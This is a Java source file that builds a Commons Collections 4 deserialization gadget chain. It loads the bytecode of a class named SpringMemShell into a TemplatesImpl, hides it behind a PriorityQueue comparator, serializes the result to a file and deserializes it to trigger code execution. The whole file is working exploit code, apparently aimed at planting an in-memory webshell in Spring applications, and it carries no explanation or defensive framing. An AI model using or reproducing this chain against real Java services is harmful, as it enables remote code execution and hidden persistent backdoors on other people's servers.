package Seri;

import com.example.xagadget.User;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import com.sun.org.apache.bcel.internal.Repository;


import javax.xml.transform.Templates;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC4CCGadgets2 extends User {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Repository.lookupClass(SpringMemShell.class).getBytes();
        Templates templatesImpl = new TemplatesImpl();
        Utils.setValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        Utils.setValue(templatesImpl, "_name", "aaaa");
        Utils.setValue(templatesImpl, "_tfactory", null);



        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};

        Transformer transformer = new InvokerTransformer("toString" ,null ,null);

        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(comparator);

        queue.add(templatesImpl);
        queue.add(templatesImpl);


        Utils.setValue(transformer ,"iMethodName" ,"newTransformer");

        System.out.println(Utils.serialize(queue ,"bin/CC4CCGadgets2.bin"));
        Utils.unserialize("bin/CC4CCGadgets2.bin");
    }
}
